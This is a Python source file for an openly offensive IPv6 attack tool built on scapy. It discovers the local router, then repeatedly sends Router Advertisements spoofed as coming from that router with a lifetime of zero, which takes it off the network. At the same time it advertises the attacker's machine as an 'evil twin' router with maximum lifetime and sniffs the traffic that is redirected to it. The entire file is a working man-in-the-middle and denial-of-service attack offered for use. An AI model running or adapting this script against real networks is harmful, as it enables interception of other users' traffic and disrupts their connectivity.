import subprocess
import scapy.all as scapy
import time
import random
import os
import socket
import json
import netifaces as ni
from netifaces import AF_INET, AF_INET6, AF_LINK
from scapy.layers.inet6 import IPv6, ICMPv6ND_RS, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
from scapy.all import *
from scapy.all import sr1, IP, ICMP
# Explanation:
# This tools does a couple of cool things
# Assume RA is not enabled on the target network this should work
# First the script will query to find all routers on the network via NDP_RS(Router Solicitation)
# Once routers are spotted we will kick them off by sending a spoofed NDP_RA(Router Advertisement)
# With a router lifetime of 0 essintially making them unreachable and booting that router (it actually works lol)
# Now we can simulate a evil twin like attack and send Router advertisements of our own!
# This script will put us in the middle!
# Important to note this script only assumes that one router is present

def sendNDP_NS(attacker_ipv6, attacker_mac, router_ip, interface):
    '''
    This function sends a Neighbor Solicitation (NS) message to the specified IPv6 address.

    '''
    router_mac = ''
    ether = Ether(src=attacker_mac, dst='33:33:00:00:00:02')
    base = IPv6(dst=router_ip[0], src=attacker_ipv6)
    ICMPv6NS = ICMPv6ND_NS(tgt=router_ip[0])
    src_ll_address = ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
    packet = ether / base / ICMPv6NS / src_ll_address
    # Debug: print(packet.show())
    r = srp(packet, verbose=1, timeout=10)
    answered, unanswered = r
    if answered:
        for sent_pkt, received_pkt in answered:
            print("\nFull details of the received packet:")
            router_mac = received_pkt[Ether].src
            router_ip = received_pkt[IPv6].src
            return router_ip, router_mac


def routerBooted(router_ip, router_mac, interface):
    ether = Ether(src=router_mac, dst='33:33:00:00:00:02')
    base = IPv6(src=router_ip, dst='ff02::1')
    RA = ICMPv6ND_RA(O=1, routerlifetime=0)
    ll_address = ICMPv6NDOptSrcLLAddr(lladdr=router_mac)
    packet = ether / base / RA / ll_address
    # Debug: print(packet.show())
    sendp(packet, iface=interface, verbose=0)
    pass


def sendEvilTwin(interface, attacker_ipv6, attacker_mac):
    ether = Ether(src=attacker_mac, dst='33:33:00:00:00:02')
    base = IPv6(dst='ff02::1', src=attacker_ipv6)
    RA = ICMPv6ND_RA(routerlifetime=65535)
    ll_address = ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
    packet = ether / base / RA / ll_address
    # Debug: print("Sending Evil Twin RA")
    # Debug: print(packet.show())
    sendp(packet, iface=interface, verbose=0)

    pass


def packet_analyzer(packet):
    if IPv6 in packet:
        print("Packet captured:")
        print(f"{packet[IPv6].src} -> {packet[IPv6].dst}")


def filtered_ips(attacker_ipv6, output):
    ipv6_pattern = r'([0-9a-fA-F]{1,4}::[0-9a-fA-F:]+|[0-9a-fA-F:]+:[0-9a-fA-F]{1,4})'
    all_ipv6 = re.findall(ipv6_pattern, output)
    filtered_ip = list(set([ip for ip in all_ipv6 if str(ip) !=
                            str(attacker_ipv6) and str(ip) != str('ff02::2')]))
    return filtered_ip


def main():
    # interfaces = netifaces.interfaces()
    # print("Available network interfaces:")
    # print(interfaces)
    # User needs to select interface and thats it
    parser = argparse.ArgumentParser(
        description="SLAAC Spoofer - A tool for ARP spoofing attacks\nExample: sudo python3 ARP_POISION.py -i <interface> ")

    parser.add_argument(
        "-i", "--interface", help="Interface", required=True)
    args = parser.parse_args()
    interface = args.interface
    attacker_ipv6 = ni.ifaddresses(interface)[AF_INET6][0]['addr']
    attacker_ipv6 = attacker_ipv6.split('%')[0]
    attacker_mac = ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
    print(f"Attacker IPv6: {attacker_ipv6}")
    print(f"Attacker MAC: {attacker_mac}")

    result = subprocess.run(
        ["ping6", '-c', '4', f'ff02::2%{interface}'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')
    routers = filtered_ips(attacker_ipv6, output)
    print("Routers found:")
    print(routers)
    router_ip, router_mac = sendNDP_NS(
        attacker_ipv6, attacker_mac, routers, interface)
    # We now know everything we need to know about the router
    print("Router ip: ", router_ip)
    print("Router mac: ", router_mac)
    # send one thread to send the RA

    def continuousBoot():
        while True:
            routerBooted(router_ip, router_mac, interface)
            time.sleep(2)

    spoof_thread = threading.Thread(target=continuousBoot)
    spoof_thread.start()

    def EvilTwinAttack():
        while True:
            sendEvilTwin(interface, attacker_ipv6, attacker_mac)
            time.sleep(2)

    sniffer_thread = threading.Thread(target=EvilTwinAttack)
    sniffer_thread.start()

    def startSniffer():
        sniff_filter = f"ip6 and dst host {attacker_ipv6}"
        sniff(iface=interface, filter=sniff_filter, prn=packet_analyzer)
        pass

    sniffer_thread = threading.Thread(target=startSniffer)
    sniffer_thread.start()


main()
